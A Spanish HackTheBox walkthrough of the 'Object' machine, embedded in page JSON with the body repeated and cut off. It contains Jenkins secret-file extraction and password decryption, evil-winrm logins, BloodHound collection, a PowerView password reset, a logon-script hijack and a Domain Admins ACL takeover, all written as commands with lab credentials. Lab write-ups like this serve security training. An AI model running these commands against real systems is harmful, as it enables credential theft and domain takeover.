{"pageProps":{"markdownData":"{\"orig\":\"---\\ntitle: HackTheBox - Máquina Object \\nsubtitle: Paso a paso de la explotación de la maquina Object de HackTheBox.\\ndificultad: Hard\\nos: Sistema Operativo Windows\\ndate: 2024-02-10\\ntags:\\n    - HackTheBox\\n---\\n\\n## Port Enumeration\\n\\n### TCP \\n\\nEnumeración de puertos TCP\\n\\n~~~ bash\\nsudo nmap -sS -p80,5985,8080 10.129.96.147 -A -Pn             \\n[sudo] password for kali: \\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 18:18 EDT\\nNmap scan report for 10.129.96.147\\nHost is up (0.13s latency).\\n\\nPORT     STATE SERVICE VERSION\\n80/tcp   open  http    Microsoft IIS httpd 10.0\\n|_http-title: Mega Engines\\n| http-methods: \\n|_  Potentially risky methods: TRACE\\n|_http-server-header: Microsoft-IIS/10.0\\n5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\\n|_http-title: Not Found\\n|_http-server-header: Microsoft-HTTPAPI/2.0\\n8080/tcp open  http    Jetty 9.4.43.v20210629\\n| http-robots.txt: 1 disallowed entry \\n|_/\\n|_http-title: Site doesn't have a title (text/html;charset=utf-8).\\n|_http-server-header: Jetty(9.4.43.v20210629)\\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\\nNo OS matches for host\\nNetwork Distance: 2 hops\\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\\n\\nTRACEROUTE (using port 8080/tcp)\\nHOP RTT       ADDRESS\\n1   126.52 ms 10.10.14.1\\n2   126.92 ms 10.129.96.147\\n\\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 15.22 seconds\\n\\n~~~\\n\\n    \\n\\n### UDP\\n  \\n Enumeración de UDP\\n \\n~~~ bash\\nsudo nmap -sU -F 10.129.96.147 -T5                \\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 18:19 EDT\\nNmap scan report for 10.129.96.147\\nHost is up (0.13s latency).\\nNot shown: 98 open|filtered udp ports (no-response)\\nPORT    STATE SERVICE\\n53/udp  open  domain\\n123/udp open  ntp\\n\\nNmap done: 1 IP address (1 host up) scanned in 4.44 seconds\\n\\n~~~\\n\\n## Enumeracion de Servicios   \\n\\n### HTTP port 80:\\n\\nLa enumeración con Gobuster dio como resultado que no existen otros directorios ni dominios adicionales\\n\\nBanner Grabbing\\n\\n~~~http\\nHTTP/1.1 200 OK\\nContent-Type: text/html\\nLast-Modified: Tue, 26 Oct 2021 06:21:32 GMT\\nAccept-Ranges: bytes\\nETag: \\\"61128db831cad71:0\\\"\\nServer: Microsoft-IIS/10.0\\nDate: Mon, 20 Jun 2022 21:11:13 GMT\\nConnection: close\\nContent-Length: 29932\\n~~~\\n\\n![](/Object/Pasted_image_20220620182027.png)\\n\\nIngresamos al link automation\\n\\nY nos redirige al dominio object.htb:8080. Por lo que agregamos el dominio /etc/hosts\\n\\nLuego de agregar el dominio al archivo /etc/hosts ingresamos nuevamente a la aplicación web en puerto 8080\\n\\n![](/Object/Pasted_image_20220620182300.png)\\n\\nContenido del archivo robots.txt\\n\\n~~~ bash\\n# we don't want robots to click \\\"build\\\" links\\nUser-agent: *\\nDisallow: /\\n~~~\\n\\nCreamos un usuario y logramos ingresar al sistema\\n\\n![](/Object/Pasted_image_20220620182550.png)\\n\\n## Vulnerabilities analysis\\n\\nLa siguiente página nos indica que es posible ejecutar comandos en el sistema mediante la creación de builds\\n\\nhttps://book.hacktricks.xyz/cloud-security/jenkins\\n\\nCreamos un nuevo proyecto \\n\\nVamos a la sección de triggers\\n\\nY configuramos lo siguiente\\n\\n![](/Object/Pasted_image_20220621071436.png)\\n\\nEsto lo hacemos para que se ejecute el Build donde ingresaremos nuestro comando\\n\\nEn Build presionamos sobre el botón Add build step y seleccionamos Execute Windows batch command. Luego, agregamos lo siguiente:\\n\\n![](/Object/Pasted_image_20220621071556.png)\\n\\nEsperamos unos minutos y vemos el resultado\\n\\n![](/Object/Pasted_image_20220621071328.png)\\n\\nEl software está ejecutandose como el usuario oliver\\n\\n# Explotation\\n\\nIntentaremos verificar que el sistema no tiene habilitado algun firewall\\n\\n![](/Object/Pasted_image_20220621072459.png)\\n\\nCon python creamos un servidor http a la esucha y vemos si es posible la conexión\\n\\n![](/Object/Pasted_image_20220621072512.png)\\n\\nComenzamos a enumera el sistema y extraer alguna información que nos sea util \\n\\nEnumeramos los directorios\\n\\n![](/Object/Pasted_image_20220621073347.png)\\n\\nLuego consultamos el directorio C:\\\\Users\\\\oliver\\\\AppData\\\\Local\\\\Jenkins\\\\.jenkins\\n\\n![](/Object/Pasted_image_20220621073716.png)\\n\\nSegún el siguiente sitio: https://stackoverflow.com/questions/52930545/what-is-the-purpose-of-the-jenkins-user-folder-and-what-are-these-config-files\\n\\nEl archivo config.xml del directorio users contiene información de los usuarios del sistema. Por lo que intentaremos acceder al contenido del archivo.\\n\\nC:\\\\Users\\\\oliver\\\\AppData\\\\Local\\\\Jenkins\\\\.jenkins\\\\users\\\\leftraro_9491939160013366012\\\\config.xml\\n\\n~~~xml\\n<?xml version='1.1' encoding='UTF-8'?>\\n<user>\\n  <version>10</version>\\n  <id>leftraro</id>\\n  <fullName>leftraro</fullName>\\n  <properties>\\n    <jenkins.security.ApiTokenProperty>\\n      <tokenStore>\\n        <tokenList/>\\n      </tokenStore>\\n    </jenkins.security.ApiTokenProperty>\\n    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=\\\"credentials@2.6.1\\\">\\n      <domainCredentialsMap class=\\\"hudson.util.CopyOnWriteMap$Hash\\\"/>\\n    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>\\n    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=\\\"email-ext@2.84\\\">\\n      <triggers/>\\n    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>\\n    <hudson.model.MyViewsProperty>\\n      <views>\\n        <hudson.model.AllView>\\n          <owner class=\\\"hudson.model.MyViewsProperty\\\" reference=\\\"../../..\\\"/>\\n          <name>all</name>\\n          <filterExecutors>false</filterExecutors>\\n          <filterQueue>false</filterQueue>\\n          <properties class=\\\"hudson.model.View$PropertyList\\\"/>\\n        </hudson.model.AllView>\\n      </views>\\n    </hudson.model.MyViewsProperty>\\n    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=\\\"display-url-api@2.3.5\\\">\\n      <providerId>default</providerId>\\n    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>\\n    <hudson.model.PaneStatusProperties>\\n      <collapsed/>\\n    </hudson.model.PaneStatusProperties>\\n    <jenkins.security.seed.UserSeedProperty>\\n      <seed>0a9baf906da7ec2b</seed>\\n    </jenkins.security.seed.UserSeedProperty>\\n    <hudson.search.UserSearchProperty>\\n      <insensitiveSearch>true</insensitiveSearch>\\n    </hudson.search.UserSearchProperty>\\n    <hudson.model.TimeZoneProperty/>\\n    <hudson.security.HudsonPrivateSecurityRealm_-Details>\\n      <passwordHash>#jbcrypt:$2a$10$Y4W8YbX0jiPJDGgfKcnhauOpdZ84NoaZeI/HP76dSqxQTxzShlHqO</passwordHash>\\n    </hudson.security.HudsonPrivateSecurityRealm_-Details>\\n    <hudson.tasks.Mailer_-UserProperty plugin=\\\"mailer@1.34\\\">\\n      <emailAddress>leftraro@asdas.cl</emailAddress>\\n    </hudson.tasks.Mailer_-UserProperty>\\n    <jenkins.security.LastGrantedAuthoritiesProperty>\\n      <roles>\\n        <string>authenticated</string>\\n      </roles>\\n      <timestamp>1655809043400</timestamp>\\n    </jenkins.security.LastGrantedAuthoritiesProperty>\\n  </properties>\\n</user>\\n~~~\\n\\nLuego consultamos el del usuario admin\\n\\ntype C:\\\\Users\\\\oliver\\\\AppData\\\\Local\\\\Jenkins\\\\.jenkins\\\\users\\\\\\n\\n~~~xml\\n<?xml version='1.1' encoding='UTF-8'?>\\n<user>\\n  <version>10</version>\\n  <id>admin</id>\\n  <fullName>admin</fullName>\\n  <properties>\\n    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=\\\"credentials@2.6.1\\\">\\n      <domainCredentialsMap class=\\\"hudson.util.CopyOnWriteMap$Hash\\\">\\n        <entry>\\n          <com.cloudbees.plugins.credentials.domains.Domain>\\n            <specifications/>\\n          </com.cloudbees.plugins.credentials.domains.Domain>\\n          <java.util.concurrent.CopyOnWriteArrayList>\\n            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>\\n              <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>\\n              <description></description>\\n              <username>oliver</username>\\n              <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>\\n              <usernameSecret>false</usernameSecret>\\n            </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>\\n          </java.util.concurrent.CopyOnWriteArrayList>\\n        </entry>\\n      </domainCredentialsMap>\\n    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>\\n    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=\\\"email-ext@2.84\\\">\\n      <triggers/>\\n    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>\\n    <hudson.model.MyViewsProperty>\\n      <views>\\n        <hudson.model.AllView>\\n          <owner class=\\\"hudson.model.MyViewsProperty\\\" reference=\\\"../../..\\\"/>\\n          <name>all</name>\\n          <filterExecutors>false</filterExecutors>\\n          <filterQueue>false</filterQueue>\\n          <properties class=\\\"hudson.model.View$PropertyList\\\"/>\\n        </hudson.model.AllView>\\n      </views>\\n    </hudson.model.MyViewsProperty>\\n    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=\\\"display-url-api@2.3.5\\\">\\n      <providerId>default</providerId>\\n    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>\\n    <hudson.model.PaneStatusProperties>\\n      <collapsed/>\\n    </hudson.model.PaneStatusProperties>\\n    <jenkins.security.seed.UserSeedProperty>\\n      <seed>ea75b5bd80e4763e</seed>\\n    </jenkins.security.seed.UserSeedProperty>\\n    <hudson.search.UserSearchProperty>\\n      <insensitiveSearch>true</insensitiveSearch>\\n    </hudson.search.UserSearchProperty>\\n    <hudson.model.TimeZoneProperty/>\\n    <hudson.security.HudsonPrivateSecurityRealm_-Details>\\n      <passwordHash>#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW</passwordHash>\\n    </hudson.security.HudsonPrivateSecurityRealm_-Details>\\n    <hudson.tasks.Mailer_-UserProperty plugin=\\\"mailer@1.34\\\">\\n      <emailAddress>admin@object.local</emailAddress>\\n    </hudson.tasks.Mailer_-UserProperty>\\n    <jenkins.security.ApiTokenProperty>\\n      <tokenStore>\\n        <tokenList/>\\n      </tokenStore>\\n    </jenkins.security.ApiTokenProperty>\\n    <jenkins.security.LastGrantedAuthoritiesProperty>\\n      <roles>\\n        <string>authenticated</string>\\n      </roles>\\n      <timestamp>1634793332195</timestamp>\\n    </jenkins.security.LastGrantedAuthoritiesProperty>\\n  </properties>\\n</user>\\n~~~\\n\\nPara extraer las contraseñas podemos utilizar el siguiente script en python\\n\\n\\nDebemos descargar dos archivos \\n\\n- master.key \\n- hudson.util.Secret\\n\\nComo este ultimo es un binario, lo convertiremos a base64 y luego lo decodificaremos y guardaremos en nuestro sistema:\\n\\n~~~\\npowershell -c [convert]::ToBase64String((cat C:\\\\Users\\\\oliver\\\\AppData\\\\Local\\\\Jenkins\\\\.jenkins\\\\secrets\\\\hudson.util.Secret -Encoding byte))\\n~~~\\n\\nhudson.util.Secret\\n\\n~~~\\ngWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=\\n~~~\\n\\nmaster.key\\n\\n~~~\\nZjY3M2ZkYjBjNGZjYzMzOTA3MDQzNWJkYmUxYTAzOWQ4M2E1OTdiZjIxZWFmYmI3ZjliMzViNTBmY2UwMDZlNTY0Y2ZmNDU2NTUzZWQ3M2NiMWZhNTY4YjY4YjMxMGFkZGM1NzZmMTYzN2E3ZmU3MzQxNGE0YzZmZjEwYjRlMjNhZGM1MzhlOWIzNjlhMGM2ZGU4ZmMyOTlkZmEyYTM5MDRlYzczYTI0YWE0ODU1MGIyNzZiZTUxZjkxNjU2Nzk1OTViMmNhYzAzY2MyMDQ0ZjNjNzAyZDY3NzE2OWUyZjRkM2JkOTZkODMyMWEyZTE5ZTJiZjBjNzZmZTMxZGIxOQ==\\n~~~\\n\\nDescodificamos los archivo y ejecutamos el script:\\n\\n~~~bash\\npython decrypt.py master.key hudson.util.Secret config.xml\\nc1cdfun_d2434\\n~~~\\n\\n## Getting a shell\\n\\nAhora con las credenciales del usuario oliver podemos usar el servicio WinRM\\n\\n- User: oliver\\n- Password: c1cdfun_d2434\\n\\n~~~ bash\\nevil-winrm -i 10.129.90.135 -u oliver -p c1cdfun_d2434\\n\\nEvil-WinRM shell v3.3\\n\\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\\n\\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\\n\\nInfo: Establishing connection to remote endpoint\\n\\n*Evil-WinRM* PS C:\\\\Users\\\\oliver\\\\Documents> whoami\\nobject\\\\oliver\\n*Evil-WinRM* PS C:\\\\Users\\\\oliver\\\\Documents> \\n\\n~~~\\n\\n## System Enumeration\\n\\nUsuarios del sistema\\n\\n~~~ bash\\n*Evil-WinRM* PS C:\\\\Users> ls\\n\\n\\n    Directory: C:\\\\Users\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\nd-----       11/10/2021   3:20 AM                Administrator\\nd-----       10/26/2021   7:59 AM                maria\\nd-----       10/26/2021   7:58 AM                oliver\\nd-r---        4/10/2020  10:49 AM                Public\\nd-----       10/21/2021   3:44 AM                smith\\n\\n~~~\\n\\nServicios que esten a la esucha en algun puerto\\n\\n~~~bash\\n*Evil-WinRM* PS C:\\\\Users> netstat -ano | findstr LISTENING\\n  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4\\n  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       900\\n  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\\n  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       900\\n  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4\\n  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       5644\\n  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2796\\n  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4\\n  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       484\\n  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1160\\n  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1520\\n  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:49684          0.0.0.0:0              LISTENING       628\\n  TCP    0.0.0.0:49695          0.0.0.0:0              LISTENING       2928\\n  TCP    0.0.0.0:62258          0.0.0.0:0              LISTENING       2872\\n  TCP    10.129.90.135:53       0.0.0.0:0              LISTENING       2928\\n  TCP    10.129.90.135:139      0.0.0.0:0              LISTENING       4\\n  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2928\\n  TCP    [::]:80                [::]:0                 LISTENING       4\\n  TCP    [::]:88                [::]:0                 LISTENING       648\\n  TCP    [::]:135               [::]:0                 LISTENING       900\\n  TCP    [::]:389               [::]:0                 LISTENING       648\\n  TCP    [::]:445               [::]:0                 LISTENING       4\\n  TCP    [::]:464               [::]:0                 LISTENING       648\\n  TCP    [::]:593               [::]:0                 LISTENING       900\\n  TCP    [::]:636               [::]:0                 LISTENING       648\\n  TCP    [::]:3268              [::]:0                 LISTENING       648\\n  TCP    [::]:3269              [::]:0                 LISTENING       648\\n  TCP    [::]:5985              [::]:0                 LISTENING       4\\n  TCP    [::]:8080              [::]:0                 LISTENING       5644\\n  TCP    [::]:9389              [::]:0                 LISTENING       2796\\n  TCP    [::]:47001             [::]:0                 LISTENING       4\\n  TCP    [::]:49664             [::]:0                 LISTENING       484\\n  TCP    [::]:49665             [::]:0                 LISTENING       1160\\n  TCP    [::]:49666             [::]:0                 LISTENING       1520\\n  TCP    [::]:49667             [::]:0                 LISTENING       648\\n  TCP    [::]:49673             [::]:0                 LISTENING       648\\n  TCP    [::]:49674             [::]:0                 LISTENING       648\\n  TCP    [::]:49684             [::]:0                 LISTENING       628\\n  TCP    [::]:49695             [::]:0                 LISTENING       2928\\n  TCP    [::]:62258             [::]:0                 LISTENING       2872\\n  TCP    [::1]:53               [::]:0                 LISTENING       2928\\n  TCP    [dead:beef::84]:53     [::]:0                 LISTENING       2928\\n  TCP    [dead:beef::eddf:29ac:70d6:2b4b]:53  [::]:0                 LISTENING       2928\\n  TCP    [fe80::eddf:29ac:70d6:2b4b%12]:53  [::]:0                 LISTENING       2928\\n\\n~~~\\n\\nAl parecer es una Servidor Active Directory\\n\\nSubimos el archivo SharpHound.ps1 para buscar vectores de ataque:\\n\\n~~~bash\\nPS C:\\\\Users\\\\oliver\\\\Desktop> upload /home/kali/HTB/machines/res/SharpHound.ps1\\nInfo: Uploading /home/kali/HTB/machines/res/SharpHound.ps1 to C:\\\\Users\\\\oliver\\\\Desktop\\\\SharpHound.ps1\\n\\n                                                             \\nData: 1298980 bytes of 1298980 bytes copied\\n\\nInfo: Upload successful!\\n\\n~~~\\n\\nLuego lo ejecutamos:\\n\\n~~~bash\\n. .\\\\SharpHound.ps1\\nInvoke-BloodHound -CollectionMethod All\\n~~~\\n\\nRevisamos loa archivos creados\\n\\n~~~bash\\nls\\n\\n\\n    Directory: C:\\\\Users\\\\oliver\\\\desktop\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\n-a----        6/21/2022   6:40 AM           9060 20220621064046_BloodHound.zip\\n-a----        6/21/2022   6:40 AM          10043 MWU2MmE0MDctMjBkZi00N2VjLTliOTMtYThjYTY4MjdhZDA2.bin\\n-a----        6/21/2022   6:35 AM         974235 SharpHound.ps1\\n-ar---        6/21/2022   4:56 AM             34 user.txt\\n\\n~~~\\n\\nDescargamos el archivo .zip\\n\\n## Elevación de privilegios\\n\\nLo importamos en bloodhound y luego buscamos el path mas corto para llegar a admin\\n\\n![](/Object/Pasted_image_20220621111052.png)\\n\\n- Desde oliver a smith forcechangepassword\\n- Desde smith a maria GenericWrite\\n- Desde maria a Administrador WriteOwner\\n\\nPara entender como explotar el cambio de contraseña para el usuario smith presionamos click derecho sobre ForceChangePassword\\n\\n![](/Object/Pasted_image_20220621111719.png)\\n\\n![](/Object/Pasted_image_20220621111731.png)\\n\\n## Consiguiendo el usuario Smith \\n\\nNos sugiere instalar powerview y hacer el cambio de contraseña con esta herramienta:\\n\\n~~~powershell\\n . .\\\\powerview.ps1\\n~~~\\nLuego ejecutamos los siguientes comandos:\\n\\n~~~powershell\\n$newpass = ConvertTo-SecureString 'Password1234#' -AsPlainText -Force\\n~~~\\n\\n~~~powershell\\nSet-DomainUserPassword -Identity smith -AccountPassword $newpass\\n~~~\\n\\nAhora el usuario smith posee las siguientes credenciales\\n\\n- User: smith\\n- Password: Password1234#\\n\\nVerificamos si tenemos acceso al sistema mediante WinRM con el usuario smith\\n\\n~~~powershell\\nevil-winrm -i 10.129.90.135 -u smith -p 'Password1234#'                            \\n\\nEvil-WinRM shell v3.3\\n\\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\\n\\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\\n\\nInfo: Establishing connection to remote endpoint\\n\\n*Evil-WinRM* PS C:\\\\Users\\\\smith\\\\Documents> \\n~~~\\n\\n## Consiguiendo el usuario Maria\\n\\nPara conseguir acceso al usuario maria, Bloodhound nos sugiere utilizar nuevamente el modulo powerview.ps1 junto con sus componentes Set-DomainObject y Get-DomainSPNTicket\\n\\nSin embargo, el ataque no fue exitoso, Hacktricks sugiere que se puede usar el GenericWrite para modificar los script de logon.\\n\\nhttps://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user\\n\\nPor lo que usamos los siguientes comandos\\n\\n~~~powershell \\necho \\\"ls \\\\users\\\\maria > c:\\\\tmp\\\\out\\\" > cmd.ps1\\n~~~\\n\\n~~~powershell\\nSet-DomainObject -Identity maria -SET @{scriptpath=\\\"C:\\\\\\\\tmp\\\\\\\\cmd.ps1\\\"}\\n~~~\\n\\nLuego leemos el archivo out y vemos lo siguiente\\n\\n~~~powershell\\ntype out\\n\\n\\n    Directory: C:\\\\users\\\\maria\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\nd-r---       10/22/2021   3:54 AM                3D Objects\\nd-r---       10/22/2021   3:54 AM                Contacts\\nd-r---       10/25/2021   3:47 AM                Desktop\\nd-r---       10/25/2021  10:07 PM                Documents\\nd-r---       10/22/2021   3:54 AM                Downloads\\nd-r---       10/22/2021   3:54 AM                Favorites\\nd-r---       10/22/2021   3:54 AM                Links\\nd-r---       10/22/2021   3:54 AM                Music\\nd-r---       10/22/2021   3:54 AM                PictuObject\\nd-r---       10/22/2021   3:54 AM                Saved Games\\nd-r---       10/22/2021   3:54 AM                Searches\\nd-r---       10/22/2021   3:54 AM                Videos\\n~~~\\n\\nNotamos que el directorio Documents ha sifo modificado recientemente\\n\\n~~~powershell\\necho \\\"ls \\\\users\\\\maria\\\\desktop > \\\\tmp\\\\out \\\" > cmd.ps1\\n~~~\\n \\n Y conseguimos el siguiente archivo\\n \\n~~~powershell\\ncat out\\n\\nDirectory: C:\\\\users\\\\maria\\\\desktop\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\n-a----       10/26/2021   8:13 AM           6144 Engines.xls\\n\\n ~~~\\n\\nModificamos el archivo cmd.ps1:\\n\\n~~~powershell\\necho \\\"copy \\\\users\\\\maria\\\\desktop\\\\Engines.xls  \\\\tmp\\\\ \\\" > cmd.ps1\\n~~~\\n\\n\\n~~~powershell\\nls\\n\\n\\n    Directory: C:\\\\tmp\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\n-a----        6/21/2022   8:03 AM             96 cmd.ps1\\n-a----       10/26/2021   8:13 AM           6144 Engines.xls\\n-a----        6/21/2022   8:02 AM            830 out\\n-a----        6/21/2022   7:59 AM            830 out2\\n\\n~~~\\n\\n\\nDescargamos el archivo a nuestra VM. Luego convertimos el archivo a csv\\n\\n~~~bash\\nssconvert Engines.xls engine.csv\\n~~~\\n\\nY vemos su contenido\\n\\n~~~bash\\ncat engine.csv                           \\n\\\"Machines Information\\\",,,,,\\nName,Quantity,\\\"Date Acquired\\\",Owner,\\\"Chamber Username\\\",\\\"Chamber Password\\\"\\n\\\"Internal Combustion Engine\\\",12,2021/10/02,HTB,maria,d34gb8@\\n\\\"Stirling Engine\\\",23,2021/11/05,HTB,maria,0de_434_d545\\n\\\"Diesel Engine\\\",4,2021/02/03,HTB,maria,W3llcr4ft3d_4cls\\n~~~\\n\\nIntentamos acceder al sistema mediante WinRM como el usuario maria utilizando las contraseñas indicadas en el CSV\\n\\n## Administrador\\n\\nBloodHound nuevamente nos sugiere instalar el modulo PowerView para luego modificar  el grupo de administradores y hacer que maria sea parte de este grupo\\n\\nDefinimos a maria como el dueño del grupo Domain Admins\\n\\n~~~powershell\\nSet-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'\\n~~~\\n\\nAsiganmos todos los derechos del grupo a maria\\n\\n~~~powershell\\nAdd-DomainObjectAcl -TargetIdentity \\\"Domain Admins\\\" -PrincipalIdentity maria -Rights All\\n~~~\\n\\nAgregamos a maria al grupo Domain Admins\\n\\n~~~powershell\\nAdd-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'\\n~~~\\n\\nVerificamos a que grupos pertenece maria\\n\\n~~~powershell\\n*Evil-WinRM* PS C:\\\\Users\\\\maria\\\\Documents> net user maria\\nUser name                    maria\\nFull Name                    maria garcia\\nComment\\nUser's comment\\nCountry/region code          000 (System Default)\\nAccount active               Yes\\nAccount expires              Never\\n\\nPassword last set            10/21/2021 9:16:32 PM\\nPassword expires             Never\\nPassword changeable          10/22/2021 9:16:32 PM\\nPassword required            Yes\\nUser may change password     Yes\\n\\nWorkstations allowed         All\\nLogon script                 C:\\\\\\\\tmp\\\\\\\\cmd.ps1\\nUser profile\\nHome directory\\nLast logon                   6/21/2022 4:56:41 AM\\n\\nLogon hours allowed          All\\n\\nLocal Group Memberships      *Remote Management Use\\nGlobal Group memberships     *Domain Admins        *Domain Users\\nThe command completed successfully.\\n~~~\\n\\nFinalmente tenemos acceso como Administrador al sistema\",\"data\":{\"title\":\"HackTheBox - Máquina Object\",\"subtitle\":\"Paso a paso de la explotación de la maquina Object de HackTheBox.\",\"dificultad\":\"Hard\",\"os\":\"Sistema Operativo Windows\",\"date\":\"2024-02-10T00:00:00.000Z\",\"tags\":[\"HackTheBox\"]},\"content\":\"\\n## Port Enumeration\\n\\n### TCP \\n\\nEnumeración de puertos TCP\\n\\n~~~ bash\\nsudo nmap -sS -p80,5985,8080 10.129.96.147 -A -Pn             \\n[sudo] password for kali: \\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 18:18 EDT\\nNmap scan report for 10.129.96.147\\nHost is up (0.13s latency).\\n\\nPORT     STATE SERVICE VERSION\\n80/tcp   open  http    Microsoft IIS httpd 10.0\\n|_http-title: Mega Engines\\n| http-methods: \\n|_  Potentially risky methods: TRACE\\n|_http-server-header: Microsoft-IIS/10.0\\n5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\\n|_http-title: Not Found\\n|_http-server-header: Microsoft-HTTPAPI/2.0\\n8080/tcp open  http    Jetty 9.4.43.v20210629\\n| http-robots.txt: 1 disallowed entry \\n|_/\\n|_http-title: Site doesn't have a title (text/html;charset=utf-8).\\n|_http-server-header: Jetty(9.4.43.v20210629)\\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\\nNo OS matches for host\\nNetwork Distance: 2 hops\\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\\n\\nTRACEROUTE (using port 8080/tcp)\\nHOP RTT       ADDRESS\\n1   126.52 ms 10.10.14.1\\n2   126.92 ms 10.129.96.147\\n\\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 15.22 seconds\\n\\n~~~\\n\\n    \\n\\n### UDP\\n  \\n Enumeración de UDP\\n \\n~~~ bash\\nsudo nmap -sU -F 10.129.96.147 -T5                \\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 18:19 EDT\\nNmap scan report for 10.129.96.147\\nHost is up (0.13s latency).\\nNot shown: 98 open|filtered udp ports (no-response)\\nPORT    STATE SERVICE\\n53/udp  open  domain\\n123/udp open  ntp\\n\\nNmap done: 1 IP address (1 host up) scanned in 4.44 seconds\\n\\n~~~\\n\\n## Enumeracion de Servicios   \\n\\n### HTTP port 80:\\n\\nLa enumeración con Gobuster dio como resultado que no existen otros directorios ni dominios adicionales\\n\\nBanner Grabbing\\n\\n~~~http\\nHTTP/1.1 200 OK\\nContent-Type: text/html\\nLast-Modified: Tue, 26 Oct 2021 06:21:32 GMT\\nAccept-Ranges: bytes\\nETag: \\\"61128db831cad71:0\\\"\\nServer: Microsoft-IIS/10.0\\nDate: Mon, 20 Jun 2022 21:11:13 GMT\\nConnection: close\\nContent-Length: 29932\\n~~~\\n\\n![](/Object/Pasted_image_20220620182027.png)\\n\\nIngresamos al link automation\\n\\nY nos redirige al dominio object.htb:8080. Por lo que agregamos el dominio /etc/hosts\\n\\nLuego de agregar el dominio al archivo /etc/hosts ingresamos nuevamente a la aplicación web en puerto 8080\\n\\n![](/Object/Pasted_image_20220620182300.png)\\n\\nContenido del archivo robots.txt\\n\\n~~~ bash\\n# we don't want robots to click \\\"build\\\" links\\nUser-agent: *\\nDisallow: /\\n~~~\\n\\nCreamos un usuario y logramos ingresar al 